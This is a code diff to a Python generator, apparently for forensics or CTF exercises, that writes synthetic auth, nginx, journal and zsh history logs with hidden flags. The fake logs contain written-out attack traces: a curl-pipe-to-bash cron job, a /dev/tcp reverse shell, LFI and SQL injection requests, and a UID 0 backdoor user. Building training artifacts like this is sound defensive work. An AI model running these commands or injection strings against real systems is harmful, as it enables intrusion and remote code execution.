@@ -21,6 +21,8 @@ except Exception:
     pass
 
 import argparse
+import base64
+import datetime as dt
 import hashlib
 import io
 import json
@@ -291,6 +293,126 @@ def write_vm_set(out_dir):
     return res
 
 
+# ---------------------------------------------------------------- логи
+
+def _syslog_ts(t):
+    return f"{t:%b} {t.day:2d} {t:%H:%M:%S}"
+
+
+def make_auth_log(flag, year=2024):
+    """auth.log: брутфорс → успешный вход → sudo с base64 → новый uid 0 → cron."""
+    t0 = dt.datetime(year, 3, 14, 9, 0, 0)
+    out = []
+
+    def L(sec, prog, msg):
+        out.append(f"{_syslog_ts(t0 + dt.timedelta(seconds=sec))} srv01 {prog}: {msg}")
+
+    L(0, "sshd[1001]", "Accepted publickey for alice from 10.0.0.5 port 50022 ssh2: RSA SHA256:x")
+    for i in range(12):
+        user = ("root", "admin", "test")[i % 3]
+        inv = "" if user == "root" else "invalid user "
+        L(600 + 2 * i, "sshd[1100]", f"Failed password for {inv}{user} from 203.0.113.7 "
+                                     f"port {40000 + i} ssh2")
+    L(630, "sshd[1100]", "Accepted password for root from 203.0.113.7 port 40100 ssh2")
+    payload = base64.b64encode(f"backup key {flag}".encode()).decode()
+    L(665, "sudo", f"    root : TTY=pts/0 ; PWD=/root ; USER=root ; "
+                   f"COMMAND=/bin/bash -c echo {payload} | base64 -d > /tmp/.k")
+    L(720, "useradd[2000]", "new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash")
+    L(750, "usermod[2001]", "add 'backdoor' to group 'sudo'")
+    L(760, "passwd[2002]", "pam_unix(passwd:chauthtok): password changed for backdoor")
+    L(780, "CRON[3000]", "(root) CMD (curl -s http://198.51.100.9/x.sh | bash)")
+    L(840, "su[3100]", "pam_unix(su:session): session opened for user root(uid=0) by alice(uid=1000)")
+    return "\n".join(out) + "\n"
+
+
+def make_access_log(flag, year=2024):
+    """nginx combined: обычный трафик, Nikto, LFI, UNION, слепая SQLi (флаг), base64-параметр."""
+    t0 = dt.datetime(year, 3, 14, 10, 0, 0)
+    out = []
+
+    def L(sec, ip, req, st, size, ua="Mozilla/5.0 (X11; Linux x86_64)"):
+        t = t0 + dt.timedelta(seconds=sec)
+        out.append(f'{ip} - - [{t:%d/%b/%Y:%H:%M:%S} +0000] "{req}" {st} {size} "-" "{ua}"')
+
+    for i in range(10):
+        L(i, "10.0.0.8", "GET /index.html HTTP/1.1", 200, 512)
+    for i in range(25):
+        L(30 + i, "198.51.100.23", f"GET /admin{i}.php HTTP/1.1", 404, 162,
+          "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000)")
+    L(70, "198.51.100.23", "GET /view.php?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1", 200, 1820)
+    L(71, "198.51.100.23", "GET /item.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- "
+                           "HTTP/1.1", 200, 733)
+    from urllib.parse import quote
+    sec = 100
+    for pos, ch in enumerate(flag, 1):
+        lo, hi = 0, 127
+        while lo < hi:
+            mid = (lo + hi) // 2
+            cond = ord(ch) > mid
+            q = (f"1 AND ORD(MID((SELECT IFNULL(CAST(secret AS NCHAR),0x20) FROM app.vault "
+                 f"ORDER BY id LIMIT 0,1),{pos},1))>{mid}")
+            L(sec, "192.0.2.77", f"GET /item.php?id={quote(q)} HTTP/1.1", 200,
+              1532 if cond else 980, "sqlmap/1.7.2#stable (https://sqlmap.org)")
+            sec += 1
+            if cond:
+                lo = mid + 1
+            else:
+                hi = mid
+    token = base64.b64encode(b"user=guest;role=admin").decode()
+    L(sec + 5, "10.0.0.9", f"GET /api/session?data={quote(token)} HTTP/1.1", 200, 90)
+    pw = "pw_" + hashlib.md5(flag.encode()).hexdigest()[:8]
+    L(sec + 6, "10.0.0.9", f"GET /login?user=admin&password={pw} HTTP/1.1", 302, 0)
+    return "\n".join(out) + "\n"
+
+
+def make_journal_json(flag, year=2024):
+    """journalctl -o json: брутфорс sshd + MESSAGE массивом байт (там флаг)."""
+    t0 = int(dt.datetime(year, 3, 14, 8, 30, tzinfo=dt.timezone.utc).timestamp() * 1e6)
+    out = []
+    for i in range(6):
+        out.append(json.dumps({"__REALTIME_TIMESTAMP": str(t0 + i * 3_000_000),
+                               "_HOSTNAME": "web01", "SYSLOG_IDENTIFIER": "sshd", "_PID": "812",
+                               "MESSAGE": f"Failed password for invalid user oracle from "
+                                          f"192.0.2.44 port {50100 + i} ssh2"}))
+    out.append(json.dumps({"__REALTIME_TIMESTAMP": str(t0 + 60_000_000), "_HOSTNAME": "web01",
+                           "SYSLOG_IDENTIFIER": "backup", "_PID": "900",
+                           "MESSAGE": list(f"backup token {flag}\x00".encode())}))
+    return "\n".join(out) + "\n"
+
+
+def make_bash_history(flag, year=2024):
+    """zsh extended history: загрузка, chmod, пароль в mysql, флаг в \\x-escape, реверс-шелл."""
+    t0 = int(dt.datetime(year, 3, 14, 9, 0, tzinfo=dt.timezone.utc).timestamp())
+    pw = "pw_" + hashlib.md5(b"mysql" + flag.encode()).hexdigest()[:8]
+    esc = "".join(f"\\x{b:02x}" for b in flag.encode())
+    cmds = ["ls -la", "wget http://198.51.100.9/l.sh -O /tmp/l.sh", "chmod +x /tmp/l.sh",
+            f"mysql -u root -p{pw} -e 'select 1'", f"echo -e '{esc}' > /dev/null",
+            "bash -i >& /dev/tcp/198.51.100.9/4444 0>&1", "history -c"]
+    return "".join(f": {t0 + 10 * i}:0;{c}\n" for i, c in enumerate(cmds)), pw
+
+
+def write_log_set(out_dir):
+    """Логи в папку. → {имя: (путь, флаг)}"""
+    os.makedirs(out_dir, exist_ok=True)
+    res = {}
+    for kind, fn in (("auth", "auth.log"), ("access", "access.log"),
+                     ("journal", "journal.json"), ("history", ".zsh_history")):
+        flag = gen_flag("log_" + kind)
+        if kind == "auth":
+            text = make_auth_log(flag)
+        elif kind == "access":
+            text = make_access_log(flag)
+        elif kind == "journal":
+            text = make_journal_json(flag)
+        else:
+            text, _pw = make_bash_history(flag)
+        p = os.path.join(out_dir, fn)
+        with open(p, "w", encoding="utf-8", newline="\n") as f:
+            f.write(text)
+        res[kind] = (p, flag)
+    return res
+
+
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--out", required=True, help="папка для артефактов")
@@ -298,6 +420,8 @@ def main():
     manifest = {}
     for k, (p, flag, _raw) in write_vm_set(os.path.join(a.out, "vm")).items():
         manifest[k] = {"path": p, "flag": flag}
+    for k, (p, flag) in write_log_set(os.path.join(a.out, "logs")).items():
+        manifest["log_" + k] = {"path": p, "flag": flag}
     with open(os.path.join(a.out, "manifest.json"), "w", encoding="utf-8") as f:
         json.dump(manifest, f, ensure_ascii=False, indent=2)
     print(f"[+] {len(manifest)} артефактов в {a.out}")
